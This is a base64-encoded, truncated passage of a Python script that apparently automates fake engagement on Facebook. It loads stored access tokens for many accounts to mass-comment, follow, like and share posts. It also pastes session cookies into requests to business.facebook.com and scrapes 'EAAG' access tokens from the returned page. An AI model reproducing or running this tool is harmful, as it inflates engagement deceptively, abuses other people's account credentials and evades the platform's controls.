KUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGlmIG51bV9jb21tZW50cyA8PSAwOgogICAgICAgICAgICBwcmludCgiTnVtYmVyIG9mIGNvbW1lbnRzIG11c3QgYmUgZ3JlYXRlciB0aGFuIDAuIikKICAgICAgICAgICAgcmV0dXJuCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgY29tbWVudHNfbGlzdCA9IFtdCiAgICBmb3IgaSBpbiByYW5nZShudW1fY29tbWVudHMpOgogICAgICAgIGNvbW1lbnQgPSBpbnB1dChmIiAgICB7Z3JlZW59RW50ZXIgY29tbWVudCB7aSArIDF9OiAiKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGNvbW1lbnRzX2xpc3QuYXBwZW5kKGNvbW1lbnQpCgogICAgCiAgICB0cnk6CiAgICAgICAgbnVtX2FjY291bnRzID0gaW50KGlucHV0KGYiICAge2dyZWVufUVudGVyIHRoZSBudW1iZXIgb2YgYWNjb3VudHMgdG8gdXNlIGZvciBjb21tZW50aW5nICgxIHRvIHtsZW4odG9rZW5zKX0pOiAiKSkKICAgICAgICBpZiBudW1fYWNjb3VudHMgPiBsZW4odG9rZW5zKSBvciBudW1fYWNjb3VudHMgPD0gMDoKICAgICAgICAgICAgcHJpbnQoZiJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIgYmV0d2VlbiAxIGFuZCB7bGVuKHRva2Vucyl9LiIpCiAgICAgICAgICAgIHJldHVybgogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoIlBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlci4iKQogICAgICAgIHJldHVybgoKICAgICMgU3RlcCA3OiBQZXJmb3JtIGNvbW1lbnRzIHVzaW5nIG11bHRpdGhyZWFkaW5nCiAgICByZXN1bHRzID0gW10KICAgIGNvbW1lbnRzX2NvdW50ID0gMAogICAgbWF4X3dvcmtlcnMgPSAyICAjIFNldCB0aGUgbWF4aW11bSBudW1iZXIgb2YgdGhyZWFkcwogICAgCiAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz1tYXhfd29ya2VycykgYXMgZXhlY3V0b3I6CiAgICAgICAgZnV0dXJlX3RvX3Rva2VuID0ge30KICAgICAgICBmb3IgaSwgdG9rZW4gaW4gZW51bWVyYXRlKHRva2Vuc1s6bnVtX2FjY291bnRzXSk6CiAgICAgICAgICAgIGNvbW1lbnQgPSByYW5kb20uY2hvaWNlKGNvbW1lbnRzX2xpc3QpICAjIFJhbmRvbWx5IHBpY2sgYSBjb21tZW50CiAgICAgICAgICAgIGZ1dHVyZSA9IGV4ZWN1dG9yLnN1Ym1pdChjb21tZW50X3dpdGhfdG9rZW4sIHBvc3RfaWQsIGNvbW1lbnQsIHRva2VuKQogICAgICAgICAgICBmdXR1cmVfdG9fdG9rZW5bZnV0dXJlXSA9IHRva2VuCgogICAgICAgIGZvciBmdXR1cmUgaW4gYXNfY29tcGxldGVkKGZ1dHVyZV90b190b2tlbik6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHJlc3VsdCA9IGZ1dHVyZS5yZXN1bHQoKQogICAgICAgICAgICAgICAgcHJpbnQocmVzdWx0KSAgIyBQcmludCB0aGUgcmVzdWx0IG9mIHRoZSBjb21tZW50IGF0dGVtcHQKICAgICAgICAgICAgICAgIGlmICJTVUNDRVNTRlVMTFkiIGluIHJlc3VsdDoKICAgICAgICAgICAgICAgICAgICBjb21tZW50c19jb3VudCArPSAxCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIHByaW50KGYiRXJyb3IgcHJvY2Vzc2luZyB0b2tlbjoge2V9IikKCiAgICBwcmludChmIlRvdGFsIGNvbW1lbnRzIG1hZGU6IHtjb21tZW50c19jb3VudH0iKQojIEV4ZWN1dGUgdGhlIGZ1bmN0aW9uCgoKIyBFeGVjdXRlIHRoZSBmdW5jdGlvbgoKaW1wb3J0IHJlcXVlc3RzCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IsIGFzX2NvbXBsZXRlZAoKCgpkZWYgbG9hZF90b2tlbnMoZmlsZV9wYXRoKToKICAgICIiIkxvYWQgdG9rZW5zIGZyb20gdGhlIHNwZWNpZmllZCBmaWxlLiIiIgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyJykgYXMgZmlsZToKICAgICAgICAgICAgdG9rZW5zID0gW2xpbmUuc3RyaXAoKSBmb3IgbGluZSBpbiBmaWxlLnJlYWRsaW5lcygpIGlmIGxpbmUuc3RyaXAoKV0KICAgICAgICByZXR1cm4gdG9rZW5zCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgcHJpbnQoIkZpbGUgbm90IGZvdW5kLiIpCiAgICAgICAgcmV0dXJuIFtdCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJFcnJvciBsb2FkaW5nIHRva2Vuczoge2V9IikKICAgICAgICByZXR1cm4gW10KCmRlZiBmb2xsb3dfYW5kX2xpa2VfZmFjZWJvb2tfcGFnZSh1aWQsIGFjY2Vzc190b2tlbik6CiAgICAiIiJGb2xsb3cgYW5kIGxpa2UgYSBGYWNlYm9vayBwYWdlL3Byb2ZpbGUgdXNpbmcgdGhlIGdpdmVuIFVJRCBhbmQgYWNjZXNzIHRva2VuLiIiIgogICAgZm9sbG93X3VybCA9IGYiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjIwLjAve3VpZH0vc3Vic2NyaWJlcnMiCiAgICBoZWFkZXJzID0geydBdXRob3JpemF0aW9uJzogZidCZWFyZXIge2FjY2Vzc190b2tlbn0nfQogICAgCiAgICAjIFBlcmZvcm0gdGhlIGZvbGxvdyBhY3Rpb24KICAgIGZvbGxvd19yZXNwb25zZSA9IG1ha2VfaHR0cF9yZXF1ZXN0KCdQT1NUJywgZm9sbG93X3VybCwgaGVhZGVycz1oZWFkZXJzKQogICAgaWYgZm9sbG93X3Jlc3BvbnNlIGFuZCAnZXJyb3InIGluIGZvbGxvd19yZXNwb25zZToKICAgICAgICBwcmludChmIkVycm9yIGZvbGxvd2luZyBwYWdlIHdpdGggVUlEIHt1aWR9OiB7Zm9sbG93X3Jlc3BvbnNlWydlcnJvciddWydtZXNzYWdlJ119IikKICAgIGVsaWYgZm9sbG93X3Jlc3BvbnNlOgogICAgICAgIHByaW50KGYiXDAzM1sxOzMybVtTVUNDRVNTRlVMTFldIEZPTExPV0VEIHRoZSBwYWdlL3Byb2ZpbGUgd2l0aCBVSUQge3VpZH1cMDMzWzBtIikKCiAgICAjIFBlcmZvcm0gdGhlIGxpa2UgYWN0aW9uCiAgICBsaWtlX3VybCA9IGYiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjIwLjAve3VpZH0vbGlrZXMiCiAgICBsaWtlX3Jlc3BvbnNlID0gbWFrZV9odHRwX3JlcXVlc3QoJ1BPU1QnLCBsaWtlX3VybCwgaGVhZGVycz1oZWFkZXJzKQogICAgaWYgbGlrZV9yZXNwb25zZSBhbmQgJ2Vycm9yJyBpbiBsaWtlX3Jlc3BvbnNlOgogICAgICAgIHByaW50KGYiRXJyb3IgbGlraW5nIHBhZ2Ugd2l0aCBVSUQge3VpZH06IHtsaWtlX3Jlc3BvbnNlWydlcnJvciddWydtZXNzYWdlJ119IikKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoZiJcMDMzWzE7MzJtW1NVQ0NFU1NGVUxMWV0gTElLRUQgdGhlIHBhZ2UvcHJvZmlsZSB3aXRoIFVJRCB7dWlkfVwwMzNbMG0iKQoKZGVmIG1ha2VfaHR0cF9yZXF1ZXN0KG1ldGhvZCwgdXJsLCBoZWFkZXJzPU5vbmUsIGRhdGE9Tm9uZSk6CiAgICAiIiJNYWtlIGFuIEhUVFAgcmVxdWVzdC4iIiIKICAgIHRyeToKICAgICAgICBpZiBtZXRob2QudXBwZXIoKSA9PSAnUE9TVCc6CiAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGhlYWRlcnM9aGVhZGVycywgZGF0YT1kYXRhKQogICAgICAgIGVsaWYgbWV0aG9kLnVwcGVyKCkgPT0gJ0dFVCc6CiAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHVybCwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYiVW5zdXBwb3J0ZWQgSFRUUCBtZXRob2Q6IHttZXRob2R9IikKICAgICAgICAgICAgcmV0dXJuIE5vbmUKCiAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICByZXR1cm4gcmVzcG9uc2UuanNvbigpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoZiJIVFRQIHJlcXVlc3QgZmFpbGVkIHdpdGggc3RhdHVzIGNvZGU6IHtyZXNwb25zZS5zdGF0dXNfY29kZX0iKQogICAgICAgICAgICByZXR1cm4gcmVzcG9uc2UuanNvbigpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJBbiBlcnJvciBvY2N1cnJlZCBkdXJpbmcgdGhlIEhUVFAgcmVxdWVzdDoge3N0cihlKX0iKQogICAgICAgIHJldHVybiBOb25lCgpkZWYgcGVyZm9ybV9hY3Rpb25zX2Zyb21fZmlsZSgpOgogICAgIiIiTWFpbiBmdW5jdGlvbiB0byBtYW5hZ2UgdGhlIGZvbGxvdyBhbmQgbGlrZSBhY3Rpb25zIGJhc2VkIG9uIHVzZXIgaW5wdXQuIiIiCiAgICBmaWxlX29wdGlvbnMgPSB7CiAgICAgICAgMTogIi9zZGNhcmQvYm9vc3RwaGVyZS9GUkFBQ0NPVU5ULnR4dCIsCiAgICAgICAgMjogIi9zZGNhcmQvYm9vc3RwaGVyZS9GUkFQQUdFUy50eHQiLAogICAgICAgIDM6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXQUNDT1VOVC50eHQiLAogICAgICAgIDQ6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXUEFHRVMudHh0IgogICAgfQogICAgCiAgICBjbGVhcl9zY3JlZW4oKQogICAgam92YW4oKQogICAgCiAgICBwcmludChmIiIiICAgICB7d2hpdGV9Q0hPT1NFIFRZUEUgT0YgUkVBQ1RPUlM6IAogICAgIHtibHVlfVsxXSB7Z3JlZW59RlJBIEFDQ09VTlQgCiAgICAge2JsdWV9WzJdIHtncmVlbn1GUkEgUEFHRVMKICAgICB7Ymx1ZX1bM10ge2dyZWVufVJQVyBBQ0NPVU5UCiAgICAge2JsdWV9WzRdIHtncmVlbn1SUFcgUEFHRVMKICAgICB7cmVkfVswXSAge3JlZH0gRVhJVCAKICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iIiIpCiAgICAKICAgIHRyeToKICAgICAgICBmaWxlX2Nob2ljZSA9IGludChpbnB1dChmIiAgICB7Z3JlZW59Q2hvb3NlOiAgIikpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgaWYgZmlsZV9jaG9pY2Ugbm90IGluIGZpbGVfb3B0aW9uczoKICAgICAgICAgICAgcHJpbnQoIkludmFsaWQgY2hvaWNlLiIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGZpbGVfcGF0aCA9IGZpbGVfb3B0aW9uc1tmaWxlX2Nob2ljZV0KICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIikKICAgICAgICByZXR1cm4KCiAgICAjIFN0ZXAgMTogTG9hZCB0b2tlbnMgYW5kIGRpc3BsYXkgdGhlIHRvdGFsCiAgICB0b2tlbnMgPSBsb2FkX3Rva2VucyhmaWxlX3BhdGgpCiAgICB0b3RhbF90b2tlbnMgPSBsZW4odG9rZW5zKQogICAgCiAgICBpZiB0b3RhbF90b2tlbnMgPT0gMDoKICAgICAgICBwcmludCgiTm8gdG9rZW5zIGF2YWlsYWJsZSBmcm9tIHRoZSBzZWxlY3RlZCBmaWxlLiIpCiAgICAgICAgcmV0dXJuCgogICAgCgogICAgIyBTdGVwIDI6IEFzayBmb3IgdGhlIHN0YXJ0aW5nIGxpbmUKICAgIHRyeToKICAgICAgICBzdGFydF9saW5lID0gaW50KGlucHV0KGYiICAgIHtncmVlbn1FbnRlciB0aGUgc3RhcnRpbmcgbGluZSB7cmVkfSgxIHRvIHt0b3RhbF90b2tlbnN9e3JlZH0pOiAiKSkKICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBpZiBzdGFydF9saW5lIDwgMSBvciBzdGFydF9saW5lID4gdG90YWxfdG9rZW5zOgogICAgICAgICAgICBwcmludChmIlBsZWFzZSBlbnRlciBhIHZhbGlkIGxpbmUgbnVtYmVyIGJldHdlZW4gMSBhbmQge3RvdGFsX3Rva2Vuc30uIikKICAgICAgICAgICAgcmV0dXJuCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgIyBBZGp1c3QgdGhlIHRva2VucyBiYXNlZCBvbiB0aGUgc3RhcnRpbmcgbGluZQogICAgdG9rZW5zID0gdG9rZW5zW3N0YXJ0X2xpbmUgLSAxOl0KCiAgICAjIFN0ZXAgMzogR2V0IHRoZSBwYWdlIElECiAgICB1aWQgPSBpbnB1dChmIiAgICB7Z3JlZW59RW50ZXIgdGhlIFBhZ2UvUHJvZmlsZSBVSUQ6ICIpLnN0cmlwKCkKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgaWYgbm90IHVpZC5pc2RpZ2l0KCk6CiAgICAgICAgcHJpbnQoIkludmFsaWQgVUlELiBQbGVhc2UgZW5zdXJlIHlvdSBlbnRlcmVkIGEgY29ycmVjdCBudW1lcmljIFVJRC4iKQogICAgICAgIHJldHVybgoKICAgICMgU3RlcCA0OiBHZXQgdGhlIG51bWJlciBvZiBhY3Rpb25zCiAgICB0cnk6CiAgICAgICAgbnVtX2FjdGlvbnMgPSBpbnQoaW5wdXQoZiIgICAge2dyZWVufUxJTUlUIHtyZWR9KG5vdCBleGNlZWRpbmcge3RvdGFsX3Rva2Vuc30pOiAiKS5zdHJpcCgpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGlmIG51bV9hY3Rpb25zID4gdG90YWxfdG9rZW5zOgogICAgICAgICAgICBwcmludChmIkl0IGV4Y2VlZHMgdGhlIGxpbWl0IG9mIHt0b3RhbF90b2tlbnN9LiIpCiAgICAgICAgICAgIHJldHVybgogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoIkludmFsaWQgaW5wdXQuIFBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlciBmb3IgdGhlIGFjdGlvbnMuIikKICAgICAgICByZXR1cm4KCiAgICAjIFN0ZXAgNTogUGVyZm9ybSBhY3Rpb25zIHVzaW5nIG11bHRpdGhyZWFkaW5nCiAgICBhY3Rpb25fY291bnQgPSAwCiAgICB0YXNrcyA9IFtdCgogICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MikgYXMgZXhlY3V0b3I6CiAgICAgICAgZm9yIHRva2VuIGluIHRva2Vuc1s6bnVtX2FjdGlvbnNdOiAgIyBMaW1pdCB0aGUgdG9rZW5zIHRvIHRoZSBudW1iZXIgb2YgYWN0aW9ucyByZXF1ZXN0ZWQKICAgICAgICAgICAgZnV0dXJlID0gZXhlY3V0b3Iuc3VibWl0KGZvbGxvd19hbmRfbGlrZV9mYWNlYm9va19wYWdlLCB1aWQsIHRva2VuLnNwbGl0KCd8JylbMV0pICAjIEFzc3VtaW5nIHRva2VuIGZvcm1hdCBpcyBlbWFpbHxhY2Nlc3NfdG9rZW4KICAgICAgICAgICAgdGFza3MuYXBwZW5kKGZ1dHVyZSkKICAgICAgICAgICAgYWN0aW9uX2NvdW50ICs9IDEKCiAgICAgICAgIyBXYWl0IGZvciBhbGwgdGFza3MgdG8gY29tcGxldGUKICAgICAgICBmb3IgdGFzayBpbiBhc19jb21wbGV0ZWQodGFza3MpOgogICAgICAgICAgICB5ID0gdG9rZW4uc3BsaXQoJ3wnKVswXQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICB0YXNrLnJlc3VsdCgpICAjIFRvIHJhaXNlIGFueSBleGNlcHRpb25zIGlmIG9jY3VycmVkIGR1cmluZyBleGVjdXRpb24KICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJBbiBlcnJvciBvY2N1cnJlZCBkdXJpbmcgZXhlY3V0aW9uOiB7c3RyKGUpfSIpCgogICAgcHJpbnQoZiIgICAgIHtyZWR9SUQge3doaXRlfToge2JsdWV9e3l9IHwge2dyZWVufVxuU1VDQ0VTU0ZVTExZIEZPTExPV0VEIEFORCBMSUtFRCB8IElEOiIsIHVpZCkKICAgIHByaW50KGYiQ29tcGxldGVkIHthY3Rpb25fY291bnR9IHJlcXVlc3RlZCBhY3Rpb25zLiIpCgojIENhbGwgdGhlIG1ldGhvZCB0byBleGVjdXRlIHRoZSBmdW5jdGlvbmFsaXR5CmltcG9ydCByZXF1ZXN0cwppbXBvcnQgc3lzCmltcG9ydCB0aW1lCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IKCmdvbWVfdG9rZW4gPSBbXQoKZGVmIHRva3ooaW5wdXRfY29va2llcyk6CiAgICBmb3IgY29va2llIGluIGlucHV0X2Nvb2tpZXM6CiAgICAgICAgaGVhZGVyXyA9IHsKICAgICAgICAgICAgJ2F1dGhvcml0eSc6ICdidXNpbmVzcy5mYWNlYm9vay5jb20nLAogICAgICAgICAgICAnYWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOScsCiAgICAgICAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnOiAndmktVk4sdmk7cT0wLjksZnItRlI7cT0wLjgsZnI7cT0wLjcsZW4tVVM7cT0wLjYsZW47cT0wLjUnLAogICAgICAgICAgICAnY2FjaGUtY29udHJvbCc6ICdtYXgtYWdlPTAnLAogICAgICAgICAgICAnY29va2llJzogY29va2llLAogICAgICAgICAgICAncmVmZXJlcic6ICdodHRwczovL3d3dy5mYWNlYm9vay5jb20vJywKICAgICAgICAgICAgJ3NlYy1jaC11YSc6ICciLk5vdC9BKUJyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMDMiLCAiQ2hyb21pdW0iO3Y9IjEwMyInLAogICAgICAgICAgICAnc2VjLWNoLXVhLW1vYmlsZSc6ICc/MCcsCiAgICAgICAgICAgICdzZWMtY2gtdWEtcGxhdGZvcm0nOiAnIkxpbnV4IicsCiAgICAgICAgICAgICdzZWMtZmV0Y2gtZGVzdCc6ICdkb2N1bWVudCcsCiAgICAgICAgICAgICdzZWMtZmV0Y2gtbW9kZSc6ICduYXZpZ2F0ZScsCiAgICAgICAgICAgICdzZWMtZmV0Y2gtc2l0ZSc6ICdzYW1lLW9yaWdpbicsCiAgICAgICAgICAgICdzZWMtZmV0Y2gtdXNlcic6ICc/MScsCiAgICAgICAgICAgICd1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzJzogJzEnLAogICAgICAgIH0KICAgICAgICB0cnk6CiAgICAgICAgICAgIGhvbWVfYnVzaW5lc3MgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vYnVzaW5lc3MuZmFjZWJvb2suY29tL2NvbnRlbnRfbWFuYWdlbWVudCcsIGhlYWRlcnM9aGVhZGVyXykudGV4dAogICAgICAgICAgICB0b2tlbiA9IGhvbWVfYnVzaW5lc3Muc3BsaXQoJ0VBQUcnKVsxXS5zcGxpdCgnIiwiJylbMF0KICAgICAgICAgICAgY29va2llX3Rva2VuID0gZid7Y29va2llfXxFQUFHe3Rva2VufScKICAgICAgICAgICAgZ29tZV90b2tlbi5hcHBlbmQoY29va2llX3Rva2VuKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwogICAgcmV0dXJuIGdvbWVfdG9rZW4KCmRlZiBzaGFyZSh0YWNoLCBpZF9zaGFyZSk6CiAgICBjb29raWUgPSB0YWNoLnNwbGl0KCd8JylbMF0KICAgIHRva2VuID0gdGFjaC5zcGxpdCgnfCcpWzFdCiAgICBoZSA9IHsKICAgICAgICAnYWNjZXB0JzogJyovKicsCiAgICAgICAgJ2FjY2VwdC1lbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywKICAgICAgICAnY29ubmVjdGlvbic6ICdrZWVwLWFsaXZlJywKICAgICAgICAnY29udGVudC1sZW5ndGgnOiAnMCcsCiAgICAgICAgJ2Nvb2tpZSc6IGNvb2tpZSwKICAgICAgICAnaG9zdCc6ICdncmFwaC5mYWNlYm9vay5jb20nCiAgICB9CiAgICB0cnk6CiAgICAgICAgcmVxdWVzdHMucG9zdChmJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZlZWQ/bGluaz1odHRwczovL20uZmFjZWJvb2suY29tL3tpZF9zaGFyZX0mcHVibGlzaGVkPTAmYWNjZXNzX3Rva2VuPXt0b2tlbn0nLCBoZWFkZXJzPWhlKS5qc29uKCkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgpkZWYgc2hhcigpOgogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIGlucHV0X2Nvb2tpZXMgPSBpbnB1dChmIiAgICAge2dyZWVufUVudGVyIENvb2tpZTogIFx4MWJbMzg7MjsyMzM7MjMzOzIzM20iKS5zcGxpdCgnLCcpCiAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIGlkX3NoYXJlID0gaW5wdXQoZiIgICAgIHtncmVlbn1FbnRlciBQb3N0IElEOiBceDFiWzM4OzI7MjMzOzIzMzsyMzNtIikKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgdG90YWxfc2hhcmUgPSBpbnQoaW5wdXQoZiIgICAge2dyZWVufUhvdyBNYW55IFNoYXJlOiBceDFiWzM4OzI7MjMzOzIzMzsyMzNtIikpCiAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIGRlbGF5ID0gaW50KGlucHV0KGYiICAgIHtncmVlbn0gRGVsYXkgU2hhcmU6IFx4MWJbMzg7MjsyMzM7MjMzOzIzM20iKSkKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgcHJpbnQoJ1x4MWJbMzg7MjsxNzM7MjU1OzQ3bVsqXSBceDFiWzM4OzI7MjMzOzIzMzsyMzNtd2FpdGluZy4uLicsIGVuZD0nXHInKQogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCgogICAgYWxsID0gdG9reihpbnB1dF9jb29raWVzKQogICAgdG90YWxfbGl2ZSA9IGxlbihhbGwpCiAgICBwcmludChmJ1x4MWJbMzg7MjsxNzM7MjU1OzQ3bUxpdmU6IFx4MWJbMzg7MjsyMzM7MjMzOzIzM217dG90YWxfbGl2ZX0gXH